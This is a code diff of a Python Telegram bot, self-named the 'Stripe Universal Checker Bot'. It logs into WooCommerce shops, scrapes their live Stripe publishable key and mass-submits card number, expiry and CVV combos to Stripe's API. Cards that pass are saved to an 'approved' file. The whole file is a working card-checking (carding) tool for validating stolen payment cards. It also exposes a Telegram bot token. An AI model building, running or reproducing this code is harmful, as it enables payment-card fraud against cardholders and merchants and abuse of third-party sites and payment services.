@@ -1,233 +1,234 @@
-import logging, os, re, requests, time
-from telegram import Update, InputFile
+import logging
+import re
+import requests
+import json
+import asyncio
+from telegram import Update, Document
 from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
-from bs4 import BeautifulSoup
-from collections import defaultdict
 
-# Store user sessions: user_id -> site login and config
-user_sessions = defaultdict(dict)
+# Logging
 logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
-# Universal headers
-HEADERS = {
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
-    'Accept': '*/*',
-    'Content-Type': 'application/x-www-form-urlencoded',
-}
+# In-memory site login storage
+site_logins = {}
 
-# Regex for card parsing
-CARD_REGEX = re.compile(r'(\d{13,16})[|:](\d{2})[|:/](\d{2,4})[|:](\d{3,4})')
+# Parse card combo
+def parse_card(combo: str):
+    parts = combo.strip().replace('/', '|').split('|')
+    if len(parts) < 4:
+        return None
+    return {
+        'number': parts[0],
+        'exp_month': parts[1],
+        'exp_year': parts[2],
+        'cvc': parts[3]
+    }
 
-# ========= SITE LOGIN HANDLER =========
-async def add_site_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    args = ' '.join(context.args)
-    if not args or '|' not in args:
-        await update.message.reply_text("Format: `/addsitelogin site|email|pass`", parse_mode='Markdown')
-        return
-
-    site, email, password = map(str.strip, args.split('|'))
+# Detect Stripe setup (pk + method)
+def detect_stripe_setup(site: str, session: requests.Session):
     try:
-        session = requests.Session()
-        login_url = f'https://{site}/my-account/'
-        r = session.get(login_url, headers=HEADERS)
-        soup = BeautifulSoup(r.text, 'html.parser')
-        nonce = soup.find('input', {'name': 'woocommerce-login-nonce'})['value']
-        referer = soup.find('input', {'name': '_wp_http_referer'})['value']
+        r = session.get(site, timeout=10)
+        pk = re.search(r'pk_live_[\w]+', r.text)
+        if not pk:
+            return None
+
+        pk = pk.group(0)
+
+        if 'payment_method' in r.text:
+            method = 'payment_method'
+        elif 'token' in r.text:
+            method = 'token'
+        elif 'source' in r.text:
+            method = 'source'
+        elif 'setup_intent' in r.text:
+            method = 'setup_intent'
+        else:
+            method = 'unknown'
+
+        return {'pk': pk, 'method': method}
+    except Exception as e:
+        return None
+
+# Site login
+def site_login(site, email, password):
+    session = requests.Session()
+    try:
+        login_url = f'{site}/my-account/'
+        r = session.get(login_url, timeout=10)
+        nonce = re.search(r'name="woocommerce-login-nonce" value="(.+?)"', r.text)
+        referer = re.search(r'name="_wp_http_referer" value="(.+?)"', r.text)
+
+        if not nonce or not referer:
+            return None, "Failed to extract login form"
 
         payload = {
             'username': email,
             'password': password,
-            'woocommerce-login-nonce': nonce,
-            '_wp_http_referer': referer,
+            'woocommerce-login-nonce': nonce.group(1),
+            '_wp_http_referer': referer.group(1),
             'login': 'Log in'
         }
+        res = session.post(login_url, data=payload, timeout=10)
+        if 'customer-logout' not in res.text:
+            return None, "Login failed"
 
-        login_resp = session.post(login_url, data=payload, headers=HEADERS)
-        if 'customer-logout' not in login_resp.text:
-            raise Exception("Login failed.")
+        return session, "success"
+    except Exception as e:
+        return None, f"Login error: {str(e)}"
 
-        # Now test stripe method detection
-        setup_url = f'https://{site}/my-account/add-payment-method/'
-        setup_resp = session.get(setup_url, headers=HEADERS)
-        soup = BeautifulSoup(setup_resp.text, 'html.parser')
-        script = soup.find('script', {'id': 'wc-stripe-upe-classic-js-extra'})
+# Process one card
+def check_card(session, stripe_data, site, method, pk):
+    try:
+        if method == 'payment_method':
+            stripe_data.update({'type': 'card', 'key': pk})
+            r = session.post("https://api.stripe.com/v1/payment_methods", data=stripe_data)
+        elif method == 'token':
+            stripe_data.update({'card[number]': stripe_data['number'], 'card[exp_month]': stripe_data['exp_month'], 'card[exp_year]': stripe_data['exp_year'], 'card[cvc]': stripe_data['cvc'], 'key': pk})
+            r = session.post("https://api.stripe.com/v1/tokens", data=stripe_data)
+        elif method == 'source':
+            stripe_data.update({'type': 'card', 'card[number]': stripe_data['number'], 'card[exp_month]': stripe_data['exp_month'], 'card[exp_year]': stripe_data['exp_year'], 'card[cvc]': stripe_data['cvc'], 'key': pk})
+            r = session.post("https://api.stripe.com/v1/sources", data=stripe_data)
+        elif method == 'setup_intent':
+            stripe_data.update({'type': 'card', 'key': pk})
+            r = session.post("https://api.stripe.com/v1/payment_methods", data=stripe_data)
+        else:
+            return "Unknown method", False
 
-        if not script:
-            raise Exception("No Stripe setup found.")
+        result = r.json()
+        if 'error' in result:
+            return f"Declined ❌ - {result['error'].get('message')}", False
+        else:
+            return "Approved ✅", True
+    except Exception as e:
+        return f"Error ❗ - {str(e)}", False
 
-        config_text = script.string
-        stripe_pk = re.search(r'"publishableKey"\s*:\s*"([^"]+)"', config_text).group(1)
-        ajax_nonce = re.search(r'"createAndConfirmSetupIntentNonce"\s*:\s*"([^"]+)"', config_text).group(1)
+# Telegram command: /addsitelogin
+async def addsitelogin(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    try:
+        args = update.message.text.split(' ', 1)[1]
+        site, email, password = args.split('|')
 
-        # Try all known payloads to auto-detect
-        test_card = '4000000000000002|12|26|123'  # Declined test card
-        method_type, detected = None, None
+        session, login_status = site_login(site, email, password)
+        if login_status != "success":
+            await update.message.reply_text(f"Login failed: {login_status}")
+            return
 
-        # Create payment_method first
-        card_number, mm, yy, cvv = test_card.split('|')
-        r = session.post(
-            'https://api.stripe.com/v1/payment_methods',
-            headers={**HEADERS, 'Authorization': f'Bearer {stripe_pk}'},
-            data={
-                'type': 'card',
-                'card[number]': card_number,
-                'card[exp_month]': mm,
-                'card[exp_year]': yy,
-                'card[cvc]': cvv,
-            }
-        )
-        stripe_json = r.json()
-        if 'id' in stripe_json:
-            pm_id = stripe_json['id']
-            method_type = 'payment_method'
-            payload = {
-                'action': 'create_and_confirm_setup_intent',
-                'wc-stripe-payment-method': pm_id,
-                'wc-stripe-payment-type': 'card',
-                '_ajax_nonce': ajax_nonce
-            }
+        setup = detect_stripe_setup(site, session)
+        if not setup:
+            await update.message.reply_text("Could not auto-detect Stripe setup.")
+            return
 
-            result = session.post(f'https://{site}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent',
-                                  data=payload, headers=HEADERS)
-            try:
-                res_json = result.json()
-                status_msg = res_json.get('data', {}).get('status', 'Unknown')
-                detected = f"Test result: {status_msg.upper()} ❌"
-            except Exception:
-                detected = "Stripe response error."
-
-        # Store user config
-        user_sessions[update.effective_user.id] = {
+        site_logins[update.effective_user.id] = {
             'site': site,
             'email': email,
             'password': password,
-            'stripe_pk': stripe_pk,
-            'ajax_nonce': ajax_nonce,
-            'method': method_type,
+            'pk': setup['pk'],
+            'method': setup['method']
         }
 
-        await update.message.reply_text(
-            f"𝐒𝐢𝐭𝐞 𝐥𝐨𝐠𝐢𝐧 𝐜𝐫𝐞𝐝𝐞𝐧𝐭𝐢𝐚𝐥𝐬 𝐟𝐨𝐫 {site} 𝐡𝐚𝐯𝐞 𝐛𝐞𝐞𝐧 𝐬𝐚𝐯𝐞𝐝 𝐬𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲! ✅\n\n𝐓𝐞𝐬𝐭 𝐫𝐞𝐬𝐮𝐥𝐭: {detected}",
-            parse_mode='HTML'
-        )
+        await update.message.reply_text(f"𝐒𝐢𝐭𝐞 𝐥𝐨𝐠𝐢𝐧 𝐜𝐫𝐞𝐝𝐞𝐧𝐭𝐢𝐚𝐥𝐬 𝐟𝐨𝐫 {site} 𝐡𝐚𝐯𝐞 𝐛𝐞𝐞𝐧 𝐬𝐚𝐯𝐞𝐝 ✅\nDetected method: {setup['method']}")
     except Exception as e:
-        await update.message.reply_text(f"Failed to add site login: {e}")
+        await update.message.reply_text(f"Error: {str(e)}")
 
-# ========= SINGLE COMBO CHECK =========
+# Telegram command: /chk
 async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in user_sessions:
-        await update.message.reply_text("Please add a site login first using `/addsitelogin`.", parse_mode='Markdown')
+    if update.effective_user.id not in site_logins:
+        await update.message.reply_text("Use /addsitelogin first.")
         return
 
-    args = ' '.join(context.args)
-    match = CARD_REGEX.search(args)
-    if not match:
-        await update.message.reply_text("Invalid card format. Use `/chk cc|mm|yy|cvv`", parse_mode='Markdown')
+    args = update.message.text.split(' ', 1)[1]
+    card_data = parse_card(args)
+    if not card_data:
+        await update.message.reply_text("Invalid card format. Use cc|mm|yy|cvv")
         return
 
-    cc, mm, yy, cvv = match.groups()
-    combo = f"{cc}|{mm}|{yy}|{cvv}"
-    result = check_card(user_sessions[user_id], combo)
-    await update.message.reply_text(result)
+    login = site_logins[update.effective_user.id]
+    session, login_status = site_login(login['site'], login['email'], login['password'])
+    if login_status != "success":
+        await update.message.reply_text(f"Login error: {login_status}")
+        return
 
-# ========= FILE CHECK =========
+    result, success = check_card(session, card_data, login['site'], login['method'], login['pk'])
+    await update.message.reply_text(f"𝐂𝐡𝐞𝐜𝐤 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞𝐝: {result}")
+
+# Telegram command: /mchk
 async def mchk(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id not in user_sessions:
-        await update.message.reply_text("Please add a site login first using `/addsitelogin`.", parse_mode='Markdown')
+    if update.effective_user.id not in site_logins:
+        await update.message.reply_text("Use /addsitelogin first.")
         return
 
-    if not update.message.document:
-        await update.message.reply_text("Please upload a .txt file after using /mchk.")
+    file = update.message.document
+    if not file:
+        await update.message.reply_text("Send a .txt file with card combos.")
         return
 
-    file = await update.message.document.get_file()
-    path = f"{user_id}_combos.txt"
-    await file.download_to_drive(path)
+    file_path = await file.get_file()
+    content = await file_path.download_as_bytes()
+    combos = content.decode().splitlines()
 
-    with open(path, 'r') as f:
-        combos = [line.strip() for line in f if CARD_REGEX.match(line)]
+    msg = await update.message.reply_text("Starting mass check...")
+    stats = {'approved': 0, 'declined': 0, 'errors': 0, 'total': 0}
+    approved_lines = []
 
-    stats = {'Approved': 0, 'Declined': 0, 'Error': 0, 'Total': 0}
-    approved = []
+    login = site_logins[update.effective_user.id]
+    session, login_status = site_login(login['site'], login['email'], login['password'])
+    if login_status != "success":
+        await msg.edit_text(f"Login error: {login_status}")
+        return
 
-    for combo in combos:
-        stats['Total'] += 1
-        result = check_card(user_sessions[user_id], combo)
-        if 'Approved' in result:
-            stats['Approved'] += 1
-            approved.append(combo)
-        elif 'Declined' in result:
-            stats['Declined'] += 1
+    for line in combos:
+        card_data = parse_card(line)
+        stats['total'] += 1
+
+        if not card_data:
+            stats['errors'] += 1
+            continue
+
+        result, success = check_card(session, card_data, login['site'], login['method'], login['pk'])
+        if success:
+            stats['approved'] += 1
+            approved_lines.append(line)
         else:
-            stats['Error'] += 1
-        await update.message.reply_text(f"{combo} ➜ {result}")
+            stats['declined'] += 1
 
-    with open(f'{user_id}_approved.txt', 'w') as f:
-        for a in approved:
-            f.write(a + '\n')
-
-    await update.message.reply_document(InputFile(f'{user_id}_approved.txt'),
-                                         caption=f"✅ Done!\nTotal: {stats['Total']}\nApproved: {stats['Approved']}\nDeclined: {stats['Declined']}\nError: {stats['Error']}")
-
-# ========= CARD CHECKING CORE =========
-def check_card(config, combo):
-    try:
-        session = requests.Session()
-        login_url = f"https://{config['site']}/my-account/"
-        r = session.get(login_url, headers=HEADERS)
-        soup = BeautifulSoup(r.text, 'html.parser')
-        nonce = soup.find('input', {'name': 'woocommerce-login-nonce'})['value']
-        referer = soup.find('input', {'name': '_wp_http_referer'})['value']
-        login_data = {
-            'username': config['email'],
-            'password': config['password'],
-            'woocommerce-login-nonce': nonce,
-            '_wp_http_referer': referer,
-            'login': 'Log in'
-        }
-        session.post(login_url, data=login_data, headers=HEADERS)
-
-        cc, mm, yy, cvv = combo.split('|')
-        r = session.post(
-            'https://api.stripe.com/v1/payment_methods',
-            headers={**HEADERS, 'Authorization': f'Bearer {config["stripe_pk"]}'},
-            data={
-                'type': 'card',
-                'card[number]': cc,
-                'card[exp_month]': mm,
-                'card[exp_year]': yy,
-                'card[cvc]': cvv,
-            }
+        await msg.edit_text(
+            f"𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠...\n"
+            f"Approved ✅: {stats['approved']}\n"
+            f"Declined ❌: {stats['declined']}\n"
+            f"Errors ⚠️: {stats['errors']}\n"
+            f"Total Checked: {stats['total']}"
         )
-        js = r.json()
-        if 'error' in js:
-            return f"Declined ❌ - {js['error']['message']}"
+        await asyncio.sleep(1)
 
-        pm_id = js['id']
-        payload = {
-            'action': 'create_and_confirm_setup_intent',
-            'wc-stripe-payment-method': pm_id,
-            'wc-stripe-payment-type': 'card',
-            '_ajax_nonce': config['ajax_nonce']
-        }
-        r = session.post(f"https://{config['site']}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", data=payload)
-        js = r.json()
-        status = js.get('data', {}).get('status')
-        if status == 'succeeded':
-            return f"Approved ✅"
-        else:
-            return f"Declined ❌ - Status: {status or 'Unknown'}"
-    except Exception as e:
-        return f"Error ⚠️ - {e}"
+    with open("approved.txt", "w") as f:
+        f.write("\n".join(approved_lines))
 
-# ========= MAIN =========
-if __name__ == '__main__':
-    app = ApplicationBuilder().token("7615802418:AAFmsHTQP7_2iNEve7-aa6A6LNA4V2GfuDs").build()
-    app.add_handler(CommandHandler("addsitelogin", add_site_login))
+    await msg.edit_text(
+        f"✅ Mass check complete.\n"
+        f"Approved: {stats['approved']}\n"
+        f"Declined: {stats['declined']}\n"
+        f"Errors: {stats['errors']}\n"
+        f"Saved to approved.txt"
+    )
+
+# Start bot
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("Welcome to Stripe Universal Checker Bot. Use /addsitelogin to begin.")
+
+# Run
+def main():
+    import os
+    TOKEN = os.getenv("7615802418:AAFmsHTQP7_2iNEve7-aa6A6LNA4V2GfuDs")  # Set in Render or local .env
+
+    app = ApplicationBuilder().token(TOKEN).build()
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("addsitelogin", addsitelogin))
     app.add_handler(CommandHandler("chk", chk))
     app.add_handler(CommandHandler("mchk", mchk))
-    app.add_handler(MessageHandler(filters.Document.FILE_EXTENSION("txt"), mchk))
-    print("Bot is running...")
+    app.add_handler(MessageHandler(filters.Document.MIME_TYPE("text/plain"), mchk))
+
     app.run_polling()
+
+if __name__ == "__main__":
+    main()
